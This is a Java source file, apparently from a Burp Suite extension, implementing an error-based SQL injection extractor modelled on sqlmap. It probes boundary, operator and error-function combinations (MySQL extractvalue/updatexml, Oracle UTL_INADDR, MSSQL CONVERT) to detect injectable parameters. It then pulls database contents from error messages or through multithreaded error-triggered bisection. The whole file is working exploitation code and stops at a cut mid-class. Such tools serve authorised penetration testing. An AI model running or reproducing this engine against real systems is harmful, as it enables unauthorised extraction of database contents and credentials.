package com.omnistrike.modules.exploit.omnimap.technique;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.modules.exploit.omnimap.OmniMapCallback;
import com.omnistrike.modules.exploit.omnimap.OmniMapConfig;
import com.omnistrike.modules.exploit.omnimap.OmniMapResult;
import com.omnistrike.modules.exploit.omnimap.dbms.DbmsDialect;
import com.omnistrike.modules.exploit.omnimap.dbms.OracleDialect;
import com.omnistrike.modules.exploit.omnimap.tamper.TamperEngine;

import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Error-based SQL injection extractor for OmniMap.
 * Injects queries that cause the DBMS to leak data inside error messages.
 *
 * All DBMS now use delimiter markers (like sqlmap's kb.chars.start/stop)
 * for reliable extraction from error messages.
 *
 * DBMS-specific error functions:
 * - MySQL: extractvalue(), updatexml(), floor(rand()) double-query
 * - PostgreSQL: CAST type conversion error
 * - MSSQL: IN (SELECT), CONVERT conversion error
 * - Oracle: XMLType, UTL_INADDR, CTXSYS.DRITHSX.SN
 * - SQLite: not applicable (no useful error-based extraction)
 */
public class ErrorExtractor {

    private final MontoyaApi api;
    private final OmniMapConfig config;
    private final DbmsDialect dialect;
    private final OmniMapCallback callback;
    private final OmniMapResult result;
    private final HttpRequestResponse originalRequest;
    private volatile boolean cancelled = false;

    /** The error function template that works (detected during probe phase) */
    private String workingErrorFunction = null;

    /** The conjunction operator that works (AND or OR) */
    private String workingOperator = "AND";

    /** The boundary (prefix/suffix) that works for error-based extraction */
    private String workingPrefix = "";
    private String workingSuffix = "";

    /** Decoded marker strings for reliable extraction (all DBMS) */
    private String markerPrefix = null;
    private String markerSuffix = null;

    // ==================== Inference Mode (like BlindExtractor) ====================
    // When error text is NOT visible in the response (blind target), but error
    // conditions cause a behavioral change (status code, content length, page content),
    // we can use CASE WHEN + error trigger as a boolean oracle for bisection extraction.

    /** True when error-text extraction failed but behavioral change was detected */
    private boolean inferenceMode = false;

    /** Cached baseline responses for inference true/false conditions */
    private String inferTrueBaseline;
    private String inferFalseBaseline;

    /** Response analyzer for inference true/false comparison */
    private final ResponseAnalyzer analyzer = new ResponseAnalyzer();

    /** True once the suffix has been confirmed to produce extractable error output */
    private boolean suffixValidated = false;

    /** The error trigger expression that actually works on this target (detected, not assumed) */
    private String workingErrorTrigger = null;

    /** Full printable ASCII range */
    private static final int ASCII_MIN = 32;
    private static final int ASCII_MAX = 126;

    /** Static fallback patterns for DBMS without markers */
    private static final List<Pattern> STATIC_EXTRACTION_PATTERNS = List.of(
            // PostgreSQL/MSSQL: invalid input syntax for integer/numeric: "DATA"
            // PostgreSQL CAST AS NUMERIC produces "numeric" not "integer"!
            Pattern.compile("(?:invalid input syntax for (?:type )?(?:integer|numeric|bigint|smallint)|nvarchar value '|Conversion failed)[^\"']*[\"']([^\"']+)[\"']"),
            // MSSQL convert: when converting the nvarchar value 'DATA'
            Pattern.compile("converting the \\w+ value '([^']+)'"),
            // Oracle UTL_INADDR: ORA-29257: host DATA unknown
            Pattern.compile("ORA-\\d+:[^\"']*?([\\w@._-]+)")
    );

    /**
     * Error-function-specific patterns that prove the error FUNCTION fired (not just a syntax error).
     * Used in detection strategy 4 to avoid false positives on generic SQL syntax errors
     * caused by empty-suffix boundaries. Only patterns that indicate error-based extraction
     * output (XPATH, type conversion, duplicate entry, etc.) are included here.
     */
    private static final List<Pattern> ERROR_FUNCTION_PATTERNS = List.of(
            // MySQL EXTRACTVALUE/UPDATEXML
            Pattern.compile("XPATH syntax error:", Pattern.CASE_INSENSITIVE),
            // MySQL FLOOR double-query
            Pattern.compile("Duplicate entry '.*' for key", Pattern.CASE_INSENSITIVE),
            // MySQL GTID_SUBSET
            Pattern.compile("Malformed GTID set specification", Pattern.CASE_INSENSITIVE),
            // MySQL BIGINT/EXP overflow
            Pattern.compile("DOUBLE value is out of range", Pattern.CASE_INSENSITIVE),
            // MySQL JSON_KEYS
            Pattern.compile("Invalid JSON text", Pattern.CASE_INSENSITIVE),
            // MySQL subquery error (used in error triggers)
            Pattern.compile("Subquery returns more than 1 row", Pattern.CASE_INSENSITIVE),
            // PostgreSQL CAST conversion
            Pattern.compile("invalid input syntax for (type )?(integer|numeric)", Pattern.CASE_INSENSITIVE),
            // MSSQL CONVERT/IN conversion
            Pattern.compile("Conversion failed when converting", Pattern.CASE_INSENSITIVE),
            Pattern.compile("converting the \\w+ value '", Pattern.CASE_INSENSITIVE),
            // Oracle XMLType
            Pattern.compile("ORA-19202", Pattern.CASE_INSENSITIVE),
            // Oracle UTL_INADDR
            Pattern.compile("ORA-29257", Pattern.CASE_INSENSITIVE),
            // Oracle CTXSYS
            Pattern.compile("ORA-20000.*CTXSYS", Pattern.CASE_INSENSITIVE),
            // Oracle DBMS_UTILITY
            Pattern.compile("ORA-13797", Pattern.CASE_INSENSITIVE),
            // Oracle divisor is zero (used in error triggers)
            Pattern.compile("ORA-01476", Pattern.CASE_INSENSITIVE)
    );

    public ErrorExtractor(MontoyaApi api, OmniMapConfig config, DbmsDialect dialect,
                          OmniMapCallback callback, OmniMapResult result,
                          HttpRequestResponse originalRequest) {
        this.api = api;
        this.config = config;
        this.dialect = dialect;
        this.callback = callback;
        this.result = result;
        this.originalRequest = originalRequest;

        // Extract delimiter markers from dialect (all DBMS now have markers)
        this.markerPrefix = dialect.getErrorPrefixDecoded();
        this.markerSuffix = dialect.getErrorSuffixDecoded();

        // Initialize working boundary from config (fallback if detect() not called)
        this.workingPrefix = config.getPrefix();
        this.workingSuffix = config.getSuffix();
    }

    public void cancel() { this.cancelled = true; }

    /**
     * Probe to find a working error function + boundary combination.
     * Like sqlmap: tries EVERY boundary × operator × error function combination.
     *
     * This is critical because a boundary that works for boolean (e.g., ' ... -- -)
     * may not work for error-based. Different boundaries may be needed:
     * - Some targets need self-closing boundaries (no comment suffix)
     * - Some need specific quote types or parenthesis closings
     * - Error functions may need raw suffix (no -- -) to show the error
     *
     * Level controls which error functions are tried (more exotic at higher levels).
     * Risk 3 adds OR-based error payloads.
     *
     * @param boundaries list of {prefix, suffix} pairs to try
     * @return true if error-based extraction is viable
     */
    public boolean detect(List<String[]> boundaries) {
        List<String> errorFunctions = dialect.errorFunctionsForLevel(config.getLevel());
        if (errorFunctions.isEmpty()) {
            callback.onProgress("ERROR: No error functions for " + dialect.getName(), 0);
            return false;
        }

        // Build list of conjunction operators to try: AND always, OR at risk 3
        List<String> operators = new ArrayList<>();
        operators.add("AND");
        if (config.getRisk() >= 3) {
            operators.add("OR");
        }

        // Expand boundaries: for each boundary with a non-empty suffix, also try
        // the same prefix with NO suffix. Error functions are often self-contained —
        // the DBMS error fires during expression evaluation BEFORE the parser hits
        // any trailing syntax issue. Trying without suffix doubles detection coverage.
        List<String[]> expandedBoundaries = new ArrayList<>();
        for (String[] b : boundaries) {
            expandedBoundaries.add(b);
            if (!b[1].isEmpty()) {
                expandedBoundaries.add(new String[]{b[0], ""});
            }
        }

        int totalCombos = expandedBoundaries.size() * operators.size() * errorFunctions.size();
        callback.onProgress("ERROR: Testing " + totalCombos + " combinations (" +
                errorFunctions.size() + " functions × " + expandedBoundaries.size() +
                " boundaries × " + operators.size() + " operators)...", 5);

        // Use a guaranteed non-null test query for detection.
        String testQuery = dialect.errorTestQuery();

        callback.onProgress("ERROR: markers=[" + markerPrefix + "/" + markerSuffix +
                "], test=" + testQuery, 6);

        int tried = 0;

        // Bug 3 fix: strike counter for fast-fail when error output is not reflected.
        // If 10 consecutive probes trigger a status change (error function fires) but
        // produce NO marker text and NO known DBMS error pattern, the application is
        // suppressing error output. Abort early instead of wasting 800+ requests.
        int consecutiveBlindStrikes = 0;
        final int MAX_BLIND_STRIKES = 10;

        // Get baseline status once for strike detection
        int baselineStatusCode = 0;
        try {
            int bri = ThreadLocalRandom.current().nextInt(1000, 10000);
            String basePayload = " AND " + bri + "=" + bri + " ";
            basePayload = TamperEngine.apply(basePayload, config.getTampers());
            var baseResp = sendPayloadWith(basePayload,
                    expandedBoundaries.get(0)[0], expandedBoundaries.get(0)[1]);
            if (baseResp != null) baselineStatusCode = baseResp.statusCode();
        } catch (Exception ignored) {}

        // Like sqlmap: outer loop = operators, middle = error functions, inner = boundaries
        for (String operator : operators) {
            for (String funcTemplate : errorFunctions) {
                for (String[] boundary : expandedBoundaries) {
                    if (cancelled) return false;
                    tried++;

                    // Fast-fail: too many consecutive error probes with status change but no output
                    if (consecutiveBlindStrikes >= MAX_BLIND_STRIKES) {
                        callback.onProgress("ERROR: " + MAX_BLIND_STRIKES +
                                " consecutive error probes triggered status change but no error text reflected. " +
                                "Error output is suppressed by application. Aborting error-based, " +
                                "falling back to boolean blind.", 8);
                        // Skip to inference check below
                        break;
                    }

                    String prefix = boundary[0];
                    String suffix = boundary[1];

                    String errorPayload = String.format(funcTemplate, testQuery);
                    String payload = " " + operator + " " + errorPayload + " ";
                    payload = TamperEngine.apply(payload, config.getTampers());

                    var response = sendPayloadWith(payload, prefix, suffix);
                    if (response == null) continue;

                    String body = response.bodyToString();
                    if (body == null) continue;

                    int statusCode = response.statusCode();

                    // Detection strategy (mirrors sqlmap):
                    // 1. Try full marker extraction (best — confirms both markers work)
                    String extracted = extractFromError(body);
                    if (extracted != null && !extracted.isEmpty()) {
                        workingErrorFunction = funcTemplate;
                        workingOperator = operator;
                        workingPrefix = prefix;
                        workingSuffix = suffix;
                        callback.onProgress("ERROR: Found! " + operator + " " +
                                funcTemplate.split("\\(")[0] + " prefix=\"" + prefix +
                                "\" suffix=\"" + suffix + "\" status=" + statusCode +
                                " (extracted: '" +
                                extracted.substring(0, Math.min(20, extracted.length())) +
                                "') [" + tried + "/" + totalCombos + "]", 10);
                        return true;
                    }

                    // 2. Fallback: check if prefix marker appears in response (like sqlmap's grep).
                    //    Strip HTML tags first — marker may be wrapped in <b>, <br>, etc.
                    String strippedBody = body.replaceAll("<[^>]*>", " ").replaceAll("\\s+", " ");
                    if (markerPrefix != null && (body.contains(markerPrefix) || strippedBody.contains(markerPrefix))) {
                        workingErrorFunction = funcTemplate;
                        workingOperator = operator;
                        workingPrefix = prefix;
                        workingSuffix = suffix;
                        callback.onProgress("ERROR: Found (marker grep)! " + operator + " " +
                                funcTemplate.split("\\(")[0] + " prefix=\"" + prefix +
                                "\" suffix=\"" + suffix + "\" status=" + statusCode +
                                " [" + tried + "/" + totalCombos + "]", 10);
                        return true;
                    }

                    // 3. Check for DBMS error patterns in response even without markers.
                    // Check ALL status codes — errors can appear in 200, 500, 403, etc.
                    // HTTP 500 is especially common for SQL errors.
                    // Check both raw body AND HTML-stripped body — patterns like
                    // "Conversion failed" may be split across tags.
                    for (Pattern pattern : STATIC_EXTRACTION_PATTERNS) {
                        Matcher m = pattern.matcher(strippedBody);
                        if (m.find() && m.groupCount() > 0) {
                            String data = m.group(1).trim();
                            if (!data.isEmpty() && data.length() < 500) {
                                workingErrorFunction = funcTemplate;
                                workingOperator = operator;
                                workingPrefix = prefix;
                                workingSuffix = suffix;
                                callback.onProgress("ERROR: Found (static pattern)! " + operator + " " +
                                        funcTemplate.split("\\(")[0] + " prefix=\"" + prefix +
                                        "\" suffix=\"" + suffix + "\" status=" + statusCode +
                                        " [" + tried + "/" + totalCombos + "]", 10);
                                return true;
                            }
                        }
                    }

                    // 4. Check for error-FUNCTION-specific patterns (NOT generic syntax errors).
                    //    Uses ERROR_FUNCTION_PATTERNS instead of dialect.errorPatterns() to avoid
                    //    false positives: empty-suffix boundaries cause SQL syntax errors whose
                    //    generic messages ("You have an error in your SQL syntax") would match
                    //    dialect.errorPatterns() even though the error function never executed.
                    for (java.util.regex.Pattern errPat : ERROR_FUNCTION_PATTERNS) {
                        if (errPat.matcher(strippedBody).find()) {
                            // Error function fired but markers not extractable.
                            // Still mark as working — extraction may succeed with
                            // different queries that produce shorter output.
                            workingErrorFunction = funcTemplate;
                            workingOperator = operator;
                            workingPrefix = prefix;
                            workingSuffix = suffix;
                            callback.onProgress("ERROR: Found (error function pattern)! " + operator + " " +
                                    funcTemplate.split("\\(")[0] + " prefix=\"" + prefix +
                                    "\" suffix=\"" + suffix + "\" status=" + statusCode +
                                    " [" + tried + "/" + totalCombos + "]", 10);
                            return true;
                        }
                    }

                    // Bug 3: Strike counter — status changed (error function probably fired)
                    // but NO marker, NO pattern found → error output suppressed
                    if (baselineStatusCode > 0 && statusCode != baselineStatusCode) {
                        consecutiveBlindStrikes++;
                    } else {
                        consecutiveBlindStrikes = 0; // reset on normal status
                    }
                }
                // Break out of funcTemplate loop if strikes exceeded
                if (consecutiveBlindStrikes >= MAX_BLIND_STRIKES) break;
            }
            // Break out of operator loop if strikes exceeded
            if (consecutiveBlindStrikes >= MAX_BLIND_STRIKES) break;
        }

        // ===== Strategy 5: Behavioral inference (like BlindExtractor) =====
        // Error text isn't visible, but error conditions may cause behavioral changes.
        // Try each boundary × operator combo with a TRUE baseline vs error payload.
        // Cache TRUE baselines per (prefix, suffix, operator) to avoid duplicate requests.
        callback.onProgress("ERROR: Classic detection failed. Trying behavioral inference...", 7);
        Map<String, String[]> trueBaselineCache = new HashMap<>();
        int ri = ThreadLocalRandom.current().nextInt(1000, 10000);

        for (String operator : operators) {
            for (String funcTemplate : errorFunctions) {
                for (String[] boundary : expandedBoundaries) {
                    if (cancelled) return false;
                    tried++;

                    String prefix = boundary[0];
                    String suffix = boundary[1];

                    // Send error payload
                    String errorPayload = String.format(funcTemplate, testQuery);
                    String errPayloadStr = " " + operator + " " + errorPayload + " ";
                    errPayloadStr = TamperEngine.apply(errPayloadStr, config.getTampers());

                    var errResponse = sendPayloadWith(errPayloadStr, prefix, suffix);
                    if (errResponse == null) continue;
                    String errBody = errResponse.bodyToString();
                    if (errBody == null) continue;
                    int errStatus = errResponse.statusCode();

                    // Get or create TRUE baseline for this boundary/operator combo
                    String cacheKey = prefix + "|" + suffix + "|" + operator;
                    String[] cached = trueBaselineCache.get(cacheKey);
                    if (cached == null) {
                        String truePayloadStr = " " + operator + " " + ri + "=" + ri + " ";
                        truePayloadStr = TamperEngine.apply(truePayloadStr, config.getTampers());
                        var trueResp = sendPayloadWith(truePayloadStr, prefix, suffix);
                        if (trueResp != null && trueResp.bodyToString() != null) {
                            cached = new String[]{trueResp.bodyToString(), String.valueOf(trueResp.statusCode())};
                            trueBaselineCache.put(cacheKey, cached);
                        }
                    }
                    if (cached == null) continue;

                    String trueBody = cached[0];
                    int trueStatus = Integer.parseInt(cached[1]);

                    // Compare error response vs true baseline
                    boolean statusDiffers = errStatus != trueStatus;
                    int lenDiff = Math.abs(errBody.length() - trueBody.length());
                    double sim = analyzer.similarity(errBody, trueBody);

                    if (statusDiffers || lenDiff > 20 || sim < 0.98) {
                        // Error function causes detectable behavioral change!
                        workingErrorFunction = funcTemplate;
                        workingOperator = operator;
                        workingPrefix = prefix;
                        workingSuffix = suffix;
                        inferenceMode = true;
                        inferTrueBaseline = trueBody;
                        inferFalseBaseline = errBody;
                        analyzer.setTrueStatusCode(trueStatus);
                        analyzer.setFalseStatusCode(errStatus);

                        // Try auto-detecting a distinguishing string marker
                        String autoTrue = analyzer.autoDetectTrueString(trueBody, errBody);
                        if (autoTrue != null && !autoTrue.isEmpty()) {
                            analyzer.setTrueString(autoTrue);
                        }

                        // Detect which error trigger actually works on this target.
                        // Don't assume based on dialect name — the DBMS may be misdetected.
                        // Try each candidate and verify CASE WHEN 1=1 → 200, CASE WHEN 1=2 → 500.
                        workingErrorTrigger = detectWorkingErrorTrigger(trueStatus, errStatus);
                        if (workingErrorTrigger == null) {
                            callback.onProgress("ERROR: Inference behavioral change detected but " +
                                    "no CASE WHEN error trigger produced correct status split. " +
                                    "Skipping inference mode.", 0);
                            // Reset inference state — this combo doesn't work for extraction
                            inferenceMode = false;
                            inferTrueBaseline = null;
                            inferFalseBaseline = null;
                            continue; // try next boundary/function combo
                        }

                        callback.onProgress("ERROR: Found (inference)! " + operator + " " +
                                funcTemplate.split("\\(")[0] + " prefix=\"" + prefix +
                                "\" suffix=\"" + suffix + "\" status=" + trueStatus + "→" + errStatus +
                                " sim=" + String.format("%.3f", sim) + " lenDiff=" + lenDiff +
                                " trigger=\"" + workingErrorTrigger + "\"" +
                                (autoTrue != null ? " marker=\"" + autoTrue + "\"" : "") +
                                " [" + tried + "/" + (totalCombos * 2) + "]", 10);
                        return true;
                    }
                }
            }
        }

        callback.onProgress("ERROR: No working error function found after " + tried + " attempts", 0);
        return false;
    }

    /**
     * Extract a single value using error-based injection.
     * Classic mode: extract data from visible error text.
     * Inference mode: use CASE WHEN + error trigger as boolean oracle (like BlindExtractor).
     *
     * Tries both with and without comment suffix (-- -) because detection may have
     * picked the wrong suffix variant. On the first call, if the detected suffix fails,
     * the alternative is tried. Whichever works is locked in for subsequent calls.
     */
    public String extractSingle(String query) {
        if (cancelled || workingErrorFunction == null) return null;

        // Inference mode: use bisection with error conditions
        if (inferenceMode) {
            return extractSingleInference(query);
        }

        // Classic mode: extract from error text
        String errorPayload = String.format(workingErrorFunction, query);
        String payload = " " + workingOperator + " " + errorPayload + " ";
        payload = TamperEngine.apply(payload, config.getTampers());

        var response = sendPayload(payload);
        if (response != null) {
            String body = response.bodyToString();
            String extracted = extractFromError(body);
            if (extracted != null) {
                suffixValidated = true;
                return reverseXmlTypeReplace(extracted);
            }
        }

        // If suffix not yet validated, try with/without -- - (the other variant)
        if (!suffixValidated) {
            String altSuffix = workingSuffix.isEmpty() ? dialect.commentSuffix() : "";
            var altResponse = sendPayloadWith(payload, workingPrefix, altSuffix);
            if (altResponse != null) {
                String altBody = altResponse.bodyToString();
                String altResult = extractFromError(altBody);
                if (altResult != null) {
                    workingSuffix = altSuffix;
                    suffixValidated = true;
                    callback.onProgress("ERROR: Suffix corrected to \"" +
                            (altSuffix.isEmpty() ? "(none)" : altSuffix) + "\"", 0);
                    return reverseXmlTypeReplace(altResult);
                }
            }
        }

        // Log extraction failure for debugging
        if (response != null) {
            String body = response.bodyToString();
            int status = response.statusCode();
            boolean hasPrefix = markerPrefix != null && body != null && body.contains(markerPrefix);
            boolean hasSuffix = markerSuffix != null && body != null && body.contains(markerSuffix);
            callback.onProgress("ERROR: extractSingle failed — status=" + status +
                    " bodyLen=" + (body != null ? body.length() : 0) +
                    " markerPrefix=" + hasPrefix + " markerSuffix=" + hasSuffix +
                    " query=" + query.substring(0, Math.min(50, query.length())), 0);
        }

        return null;
    }

    /**
     * Extract a list of values using error-based injection.
     * For each row, uses LIMIT/OFFSET pagination.
     */
    public List<String> extractList(String query) {
        List<String> results = new ArrayList<>();
        if (cancelled) return results;

        // MySQL optimization: try GROUP_CONCAT first
        if ("MySQL".equals(dialect.getName())) {
            // Parse query to separate column expression from FROM clause
            // e.g., "SELECT schema_name FROM information_schema.schemata"
            // → GROUP_CONCAT(schema_name SEPARATOR 0x7c) FROM information_schema.schemata
            Matcher gcm = Pattern.compile("(?i)^SELECT\\s+(.+?)\\s+FROM\\s+(.+)$").matcher(query);
            if (gcm.matches()) {
                String col = gcm.group(1);
                String fromClause = gcm.group(2);
                String grouped = extractSingle("SELECT GROUP_CONCAT(" + col +
                        " SEPARATOR 0x7c) FROM " + fromClause);
                if (grouped != null && !grouped.isEmpty()) {
                    for (String val : grouped.split("\\|")) {
                        String trimmed = val.trim();
                        if (!trimmed.isEmpty()) results.add(trimmed);
                    }
                    if (!results.isEmpty()) return results;
                }
            }
        }

        // Row-by-row extraction using dialect-aware pagination
        Set<String> seen = new HashSet<>();
        for (int offset = 0; offset < 200 && !cancelled; offset++) {
            String limited = dialect.limitOffset(query, 1, offset);
            String val = extractSingle(limited);
            if (val == null || val.isEmpty()) break;
            String trimmed = val.trim();
            if (seen.add(trimmed)) {
                results.add(trimmed);
                String mode = inferenceMode ? "ERROR-INFERENCE" : "ERROR";
                callback.onProgress(mode + ": Extracted " + results.size() + " values so far...",
                        Math.min(90, 20 + results.size() * 5));
            }
        }

        return results;
    }

    /**
     * Extract data from an error message.
     * Like sqlmap: tries marker-based extraction first, then trimmed fallback,
     * then static regex patterns. HTML-unescapes the body before extraction
     * because apps commonly HTML-encode error output.
     */
    private String extractFromError(String body) {
        if (body == null) return null;

        // HTML unescape — like sqlmap's htmlUnescape(). Apps frequently HTML-encode
        // error messages, turning markers into entities. Decode first.
        body = htmlUnescape(body);

        // Strip HTML tags — servers wrap error output in tags like <b>ruvtDATAuurvs</b>
        // or split across tags like ruvt<br>DATA<br>uurvs, breaking marker search.
        body = body.replaceAll("<[^>]*>", " ").replaceAll("\\s+", " ");

        // Strategy 1: Extract data between the random hex markers (all DBMS with markers)
        // Like sqlmap: regex (?si)[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]
        // Uses regex with optional whitespace between markers and data to handle
        // residual spaces from HTML tag stripping.
        // Try ALL occurrences, pick the shortest valid match (actual data is shorter
        // than reflected SQL fragments).
        if (markerPrefix != null && markerSuffix != null) {
            Pattern markerPattern = Pattern.compile(
                    Pattern.quote(markerPrefix) + "\\s*(.+?)\\s*" + Pattern.quote(markerSuffix),
                    Pattern.DOTALL);
            Matcher markerMatcher = markerPattern.matcher(body);
            String bestMarkerExtraction = null;
            while (markerMatcher.find()) {
                String data = markerMatcher.group(1).trim();
                if (!data.isEmpty() && data.length() < 500) {
                    if (bestMarkerExtraction == null || data.length() < bestMarkerExtraction.length()) {
                        bestMarkerExtraction = data;
                    }
                }
            }
            if (bestMarkerExtraction != null) return bestMarkerExtraction;

            // Strategy 1b: Trimmed output fallback (like sqlmap's trimCheck).
            // When the server truncates the error message, the stop marker may be missing.
            // Search for start marker, then grab non-whitespace content after it.
            int searchFrom = 0;
            while (searchFrom < body.length()) {
                int prefixPos = body.indexOf(markerPrefix, searchFrom);
                if (prefixPos < 0) break;

                int start = prefixPos + markerPrefix.length();
                // Skip optional whitespace after start marker
                while (start < body.length() && Character.isWhitespace(body.charAt(start))) start++;
                // Find end of visible data (next newline or long whitespace gap)
                int end = start;
                while (end < body.length()) {
                    char c = body.charAt(end);
                    if (c == '\n' || c == '\r') break;
                    end++;
                }
                if (end > start) {
                    String trimmed = body.substring(start, end).trim();
                    // Try to find partial stop marker (first 2 chars)
                    if (!trimmed.isEmpty() && markerSuffix.length() >= 2) {
                        String stopPrefix = markerSuffix.substring(0, 2);
                        int stopIdx = trimmed.indexOf(stopPrefix);
                        if (stopIdx > 0) {
                            String data = trimmed.substring(0, stopIdx).trim();
                            if (!data.isEmpty() && data.length() < 500) return data;
                        }
                    }
                    // Last resort: take everything between start marker and next newline
                    if (!trimmed.isEmpty() && trimmed.length() < 500) {
                        return trimmed;
                    }
                }
                searchFrom = end > start ? end : start + 1;
            }
        }

        // Strategy 2: Static regex patterns — always tried as fallback, even if markers exist.
        // This catches cases where:
        // - Markers are mangled/encoded by the application
        // - Different DBMS error format than expected
        // - The error message format includes the data in a known pattern
        for (Pattern pattern : STATIC_EXTRACTION_PATTERNS) {
            Matcher m = pattern.matcher(body);
            if (m.find() && m.groupCount() > 0) {
                String data = m.group(1).trim();
                if (!data.isEmpty() && data.length() < 500) {
                    // Strip marker delimiters if present — static patterns capture the
                    // full error value (e.g., "rwqvDATAwurtr"), not just the data between markers
                    if (markerPrefix != null && markerSuffix != null) {
                        int pIdx = data.indexOf(markerPrefix);
                        if (pIdx >= 0) {
                            String afterPrefix = data.substring(pIdx + markerPrefix.length());
                            int sIdx = afterPrefix.indexOf(markerSuffix);
                            if (sIdx > 0) {
                                String stripped = afterPrefix.substring(0, sIdx).trim();
                                if (!stripped.isEmpty()) return stripped;
                            }
                            // Suffix might be truncated — return everything after prefix
                            if (!afterPrefix.isEmpty() && !afterPrefix.equals(markerSuffix)) {
                                // Strip trailing suffix if it's at the end
                                if (afterPrefix.endsWith(markerSuffix)) {
                                    afterPrefix = afterPrefix.substring(0, afterPrefix.length() - markerSuffix.length());
                                }
                                if (!afterPrefix.trim().isEmpty()) return afterPrefix.trim();
                            }
                        }
                    }
                    return data;
                }
            }
        }

        // Strategy 3: MySQL XPATH syntax error pattern (EXTRACTVALUE/UPDATEXML)
        // "XPATH syntax error: '\prefixDATAsuffix'" or "XPATH syntax error: '.prefixDATAsuffix'"
        String xpathResult = extractFromXpathError(body);
        if (xpathResult != null) return xpathResult;

        // Strategy 4: MySQL FLOOR double-query pattern
        // "Duplicate entry 'prefixDATAsuffix0' for key 'group_key'"
        Matcher floorMatcher = DUPLICATE_ENTRY_PATTERN.matcher(body);
        if (floorMatcher.find() && floorMatcher.groupCount() > 0) {
            String floorData = floorMatcher.group(1).trim();
            // Extract between markers if available
            if (markerPrefix != null && markerSuffix != null) {
                int pIdx = floorData.indexOf(markerPrefix);
                if (pIdx >= 0) {
                    String afterPrefix = floorData.substring(pIdx + markerPrefix.length());
                    int sIdx = afterPrefix.indexOf(markerSuffix);
                    if (sIdx > 0) {
                        return afterPrefix.substring(0, sIdx).trim();
                    }
                }
            }
        }

        // Strategy 5: MySQL GTID_SUBSET error pattern
        // "Malformed GTID set specification 'prefixDATAsuffix'"
        Matcher gtidMatcher = GTID_EXTRACT_PATTERN.matcher(body);
        if (gtidMatcher.find() && gtidMatcher.groupCount() > 0) {
            String gtidData = gtidMatcher.group(1).trim();
            if (markerPrefix != null && markerSuffix != null) {
                int pIdx = gtidData.indexOf(markerPrefix);
                if (pIdx >= 0) {
                    String afterPrefix = gtidData.substring(pIdx + markerPrefix.length());
                    int sIdx = afterPrefix.indexOf(markerSuffix);
                    if (sIdx > 0) {
                        return afterPrefix.substring(0, sIdx).trim();
                    }
                }
            }
        }

        return null;
    }

    /**
     * Extract data from MySQL XPATH syntax error messages.
     * Handles EXTRACTVALUE and UPDATEXML errors with proper marker extraction.
     */
    private String extractFromXpathError(String body) {
        Matcher xpathMatcher = XPATH_EXTRACT_PATTERN.matcher(body);
        if (!xpathMatcher.find() || xpathMatcher.groupCount() == 0) return null;

        String xpathData = xpathMatcher.group(1).trim();
        // Strip leading special chars (\, ., ~) that EXTRACTVALUE/UPDATEXML prepend
        if (!xpathData.isEmpty() && (xpathData.charAt(0) == '\\' || xpathData.charAt(0) == '.'
                || xpathData.charAt(0) == '~')) {
            xpathData = xpathData.substring(1);
        }
        // Extract data between markers from the XPATH content
        if (markerPrefix != null && markerSuffix != null) {
            int pIdx = xpathData.indexOf(markerPrefix);
            if (pIdx >= 0) {
                String afterPrefix = xpathData.substring(pIdx + markerPrefix.length());
                int sIdx = afterPrefix.indexOf(markerSuffix);
                if (sIdx > 0) {
                    return afterPrefix.substring(0, sIdx).trim();
                }
                // Suffix might be truncated by EXTRACTVALUE's 32-char limit
                if (!afterPrefix.isEmpty() && afterPrefix.length() < 200) {
                    return afterPrefix.trim();
                }
            }
        }
        // No markers? Return raw XPATH data if short enough
        if (!xpathData.isEmpty() && xpathData.length() < 200) {
            return xpathData;
        }
        return null;
    }

    /** Pattern to extract content from MySQL XPATH syntax errors (EXTRACTVALUE/UPDATEXML) */
    private static final Pattern XPATH_EXTRACT_PATTERN =
            Pattern.compile("XPATH syntax error:\\s*'([^']*)'", Pattern.CASE_INSENSITIVE);

    /** Pattern to extract content from MySQL FLOOR double-query errors */
    private static final Pattern DUPLICATE_ENTRY_PATTERN =
            Pattern.compile("Duplicate entry '([^']+)' for key", Pattern.CASE_INSENSITIVE);

    /** Pattern to extract content from MySQL GTID_SUBSET errors */
    private static final Pattern GTID_EXTRACT_PATTERN =
            Pattern.compile("Malformed GTID set specification '([^']*)'", Pattern.CASE_INSENSITIVE);

    // ==================== Inference Mode Extraction ====================
    // When error text isn't visible, use CASE WHEN + error trigger as boolean oracle.
    // TRUE condition → CASE returns 1 → no error → page looks like trueBaseline.
    // FALSE condition → CASE triggers error → page looks like falseBaseline.
    // Character-by-character bisection identical to BlindExtractor.

    /**
     * Extract a single string using inference-mode bisection.
     * Parallel character extraction like BlindExtractor.
     */
    private String extractSingleInference(String query) {
        if (cancelled || inferTrueBaseline == null) return null;

        callback.onProgress("ERROR-INFERENCE: Getting length for: " +
                query.substring(0, Math.min(60, query.length())) + "...", 15);

        int length = extractLengthInference(query);
        if (length <= 0 || cancelled) {
            callback.onProgress("ERROR-INFERENCE: Length detection returned " + length +
                    " (query may be invalid or no data found)", 0);
            return null;
        }

        callback.onProgress("ERROR-INFERENCE: Length=" + length + ", extracting chars (" +
                config.getThreads() + " threads)...", 20);

        ExecutorService pool = Executors.newFixedThreadPool(
                Math.min(config.getThreads(), length));

        char[] chars = new char[length];
        AtomicBoolean anyFailed = new AtomicBoolean(false);
        java.util.concurrent.atomic.AtomicInteger extracted = new java.util.concurrent.atomic.AtomicInteger(0);
        List<Future<?>> futures = new ArrayList<>();

        for (int pos = 1; pos <= length && !cancelled; pos++) {
            final int charPos = pos;
            futures.add(pool.submit(() -> {
                if (cancelled || anyFailed.get()) return;
                int ascii = extractCharAtPositionInference(query, charPos);
                if (ascii > 0) {
                    chars[charPos - 1] = (char) ascii;
                    int done = extracted.incrementAndGet();
                    if (done % 3 == 0 || done == length) {
                        callback.onProgress("ERROR-INFERENCE: [" + done + "/" + length + "] " +
                                new String(chars).replace('\0', '_'), 20 + (done * 60 / length));
                    }
                } else {
                    chars[charPos - 1] = '?';
                    anyFailed.set(true);
                    callback.onProgress("ERROR-INFERENCE: Failed at pos " + charPos +
                            " (ascii=" + ascii + ")", 0);
                }
            }));
        }

        for (Future<?> f : futures) {
            try { f.get(60, TimeUnit.SECONDS); }
            catch (Exception e) { break; }
        }
        pool.shutdownNow();

        String result = new String(chars).trim();
        callback.onProgress("ERROR-INFERENCE: Extracted '" + result + "'", 80);
        return result;
    }

    /**
